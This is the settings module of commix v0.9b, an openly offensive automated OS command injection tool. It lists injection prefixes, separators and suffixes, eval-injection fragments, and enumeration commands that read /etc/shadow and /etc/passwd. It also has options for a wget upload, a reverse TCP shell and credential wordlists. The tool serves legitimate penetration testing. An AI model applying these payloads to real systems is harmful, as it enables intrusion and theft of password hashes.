#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import urllib

from src.thirdparty.colorama import Fore, Back, Style, init

"""
The global variables.
"""

# About
APPLICATION = "commix"
DESCRIPTION_FULL = "Automated All-in-One OS Command Injection and Exploitation Tool"
DESCRIPTION = "The command injection exploiter"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION = "v0.9b"
YEAR    = "2014-2016"
AUTHOR_TWITTER = "@ancst" 
APPLICATION_TWITTER = "@commixproject" 

# Inject Tag
INJECT_TAG = "INJECT_HERE"

# The wildcard character
WILDCARD_CHAR = "*"

# Testable parameter(s) comma separated. 
TEST_PARAMETER = ""

# Default target host OS (Unix-like)
TARGET_OS = "unix"

# Exploitation techniques states
CLASSIC_STATE = False
EVAL_BASED_STATE = False
TIME_BASED_STATE = False
FILE_BASED_STATE = False

# Check Commit ID
if os.path.isdir("./.git"):
  with open('.git/refs/heads/master', 'r') as f:
    COMMIT_ID = "-" + "git" + "-" + f.readline()[0:7]
else:
  os.chdir("src/")
  COMMIT_ID = "-" + "nongit" + "-" + time.strftime("%Y%m%d", time.gmtime(os.path.getmtime(min(os.listdir(os.getcwd()), key=os.path.getctime))))

# Check if OS is Windows.
IS_WINDOWS = hasattr(sys, 'getwindowsversion')

# Git URL.
GIT_URL = "https://github.com/stasinopoulos/" + APPLICATION + ".git"

# Output Directory
OUTPUT_DIR = ".output/"  

# Output file name
OUTPUT_FILE_NAME = "logs"

# Output file name
OUTPUT_FILE_EXT = ".txt"
OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT

# Max Length.
MAXLEN = "10000"

# Slow target response.
SLOW_TARGET_RESPONSE = 3

# The testable parameter.
TESTABLE_PARAMETER = "" 

# The HTTP header name.
HTTP_HEADER = ""

# The command injection prefixes.
PREFIXES = ["", " ", "'", "\"", "&", "%26", "|", "%7C", "%27", "%22"] 

# The command injection separators.
SEPARATORS = [";", "%3B", "&", "%26", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a"]

# The command injection suffixes.
SUFFIXES = ["", "'", "\"", "#", "//", "\\\\", "&", "%26", "|", "%7C", "%27", "%22", "%5C%5C", "%2F%2F"]

# Bad combination of prefix and separator
JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]

# Execution functions
EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]

# The code injection prefixes.
EVAL_PREFIXES = ["", "'", ")", "')", "\")", "\".", "'.", ");}", "');}", "\");}"]

# The code injection separators.
EVAL_SEPARATORS = ["", ";", "%0a", "\\\\n"]

# The code injection suffixes.
EVAL_SUFFIXES = ["", "\\\\", "//", "#", ".\"", ".'", ")}"]

# The white-spaces
WHITESPACES = ["%20", "$IFS"]

# Time delay
DELAY = 1

#Level (Default: 1)
LEVEL = 1

# Default Temp Directory
TMP_PATH = ""

# Default Server's Root Directory
SRV_ROOT_DIR = ""
DEFAULT_SRV_ROOT_DIR = ""
CUSTOM_SRV_ROOT_DIR = False

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
# Output PowerShell's version number
PS_VERSION = "powershell.exe -InputFormat none write-host ([string]$(cmd /c powershell.exe -InputFormat none get-host)[3]).replace('Version','').replace(' ','').substring(1,3)"

# Current user
CURRENT_USER = "whoami"
WIN_CURRENT_USER = "echo %username%"

# The hostname
HOSTNAME = "hostname"
WIN_HOSTNAME = "echo %computername%"

# Check if current user is root
IS_ROOT = "echo $(id -u)"
# Check if current user is admin
IS_ADMIN = "powershell.exe -InputFormat none [Security.Principal.WindowsBuiltinRole]::Administrator"

# Operation System.
RECOGNISE_OS = "uname -s"
WIN_RECOGNISE_OS = "ver"

# Hardware platform.
RECOGNISE_HP = "uname -m"
WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"

# File System access options
# Read file
FILE_READ = "cat "
WIN_FILE_READ = "type "

# Write file
FILE_WRITE = "echo "

# Write file
FILE_UPLOAD = "wget "

# /etc/passwd
PASSWD_FILE = "/etc/passwd"
SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE 

# Exports users of localgroup
WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)])"

# /etc/shadow
SHADOW_FILE = "/etc/shadow"
SYS_PASSES = FILE_READ + SHADOW_FILE 

# Accepts 'YES','YE','Y','yes','ye','y'
CHOICE_YES = ['yes','ye','y']

# Accepts 'NO','N','no','n'
CHOICE_NO = ['no','n']

# Accepts 'QUIT','Q','quit','q'
CHOICE_QUIT = ['q','quit']

# Accepts 'W','w','U','u','Q','q'
CHOICE_OS = ['w','u','q']

# Accepts 'C','c','S','s','Q','q','a','A','n','N'
CHOICE_PROCEED = ['c','s','q','a','n']

# Available alternative shells
AVAILABLE_SHELLS = ["python"]

# Available injection techniques.
AVAILABLE_TECHNIQUES = [ "c", "e", "t", "f" ]

# User Agent List
USER_AGENT_LIST = [
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/31.0",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/31.0",
        # Oldies 
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
]

# Proxy Protocol
PROXY_PROTOCOL = "http"

# Privoxy Proxy
PRIVOXY_IP = "127.0.0.1"
PRIVOXY_PORT = "8118"

# Cookie injection
COOKIE_INJECTION = False

# User-Agent injection
USER_AGENT_INJECTION = False

# Referer injection
REFERER_INJECTION = False

# Custom HTTP Headers injection
CUSTOM_HEADER_INJECTION = False
CUSTOM_HEADER_NAME = "" 

# Valid URL format check
VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,300})?"

# Accepted shell menu options
SHELL_OPTIONS = [
        '?',
        'quit',
        'back',
        'os_shell',
        'reverse_tcp',
        'set',
]

# Accepted reverse tcp shell menu options
SET_OPTIONS = [
        'LHOST',
        'LPORT'
]

# Cookie delimiter
COOKIE_DELIMITER = ";"

# Cookie delimiter
PARAMETER_DELIMITER = "&"

# Web-page Charset
CHARSET = ""

# Character Sets List (basic)
CHARSET_LIST = [
        "big5",
        "euc-kr",
        "iso-8859-1",
        "iso-8859-2",
        "iso-8859-3",
        "iso-8859-4",
        "iso-8859-5",
        "iso-8859-6",
        "iso-8859-7",
        "iso-8859-8",
        "koi8-r",
        "shift-jis",
        "x-euc",
        "utf-8",
        "windows-1250",
        "windows-1251",
        "windows-1252",
        "windows-1253",
        "windows-1254",
        "windows-1255",
        "windows-1256",
        "windows-1257",
        "windows-1258",
        "windows-874",
]

# Default server banner
SERVER_BANNER = ""

# Server banners list
SERVER_BANNERS = [
    "Microsoft-IIS",
    "Apache",
    "Nginx"
]

# Server banners list
SERVER_OS_BANNERS = [
    "microsoft",
    "win",
    "debian",
    "ubuntu",
    "fedora",
    "centos",
    "freebsd",
    "unix"
]

REVERSE_TCP = False

# Injection logs report
SHOW_LOGS_MSG = False

# Enumeration options
ENUMERATION_DONE = False
ENUMERATE_AGAIN = False

# FIle access options
FILE_ACCESS_DONE = False
FILE_ACCESS_AGAIN = False

# JSON Data
IS_JSON = False

# JSON Symbols
JSON_SYMBOLS = set("{}:'")

# TFB Decimal
TFB_DECIMAL = False

# Ignore Error Message
IGNORE_ERR_MSG = False

# Windows Python (2.7) installed directory.
WIN_PYTHON_DIR = "C:\\Python27\\"

# Windows PHP installed directory.
WIN_PHP_DIR = "C:\\xampp\\php\\"

# Comment out
WIN_COMMENT = " REM "
COMMENT = " # "

#Delete command
WIN_DEL = "DEL "
DEL = "rm "

# Time-based Variables
FOUND_HOW_LONG = "" 
FOUND_DIFF = ""

# Failed (injection) tries
FAILED_TRIES = 20

# Check for PowerShell
PS_ENABLED = None

# Status Signs
SUCCESS_SIGN = "(!) "
INFO_SIGN = "(*) "
QUESTION_SIGN = "(?) "
WARNING_SIGN = "(^) Warning: "
ERROR_SIGN = "(x) Error: "
CRITICAL_SIGN = "(x) Critical: "
ABORTION_SIGN = "(x) Aborted: "
PAYLOAD_SIGN = "(~) Payload: "

# Default LHOST / LPORT setup, 
# for the reverse TCP connection
LHOST = ""
LPORT = ""

# Maybe a WAF/IPS/IDS protection.
WAF_ENABLED = False

# Session Handler
SESSION_FILE = ""
LOAD_SESSION = None

# Retest all techniques
RETEST = False

# Define the default credentials files
USERNAMES_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "usernames.txt"
PASSWORDS_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "passwords_john.txt"

REQUIRED_AUTHENTICATION = False

# Supported HTTP Authentication types
SUPPORTED_HTTP_AUTH_TYPES = [ "basic", "digest" ]

# HTTP Headers
HTTP_HEADERS = [ "useragent", "referer" ]

# Print error message
def print_error_msg(err_msg):
  result = Back.RED + ERROR_SIGN + str(err_msg) + Style.RESET_ALL 
  return result

# Print critical error message
def print_critical_msg(err_msg):
  result = Back.RED + CRITICAL_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print abortion message
def print_abort_msg(abort_msg):
  result = Back.RED + ABORTION_SIGN + str(abort_msg) + Style.RESET_ALL
  return result

# Print warning message
def print_warning_msg(warn_msg):
  result = Fore.YELLOW + WARNING_SIGN + str(warn_msg) + Style.RESET_ALL 
  return result

# Print information message
def print_info_msg(info_msg):
  result = INFO_SIGN + str(info_msg)
  return result

# Print success message
def print_success_msg(success_msg):
  result = Style.BRIGHT + SUCCESS_SIGN + str(success_msg) + Style.RESET_ALL
  return result

# Print payload (verbose mode)
def print_payload(payload):
  result = Fore.CYAN + PAYLOAD_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print question message
def print_question_msg(question_msg):
  result = QUESTION_SIGN + question_msg
  return result

#eof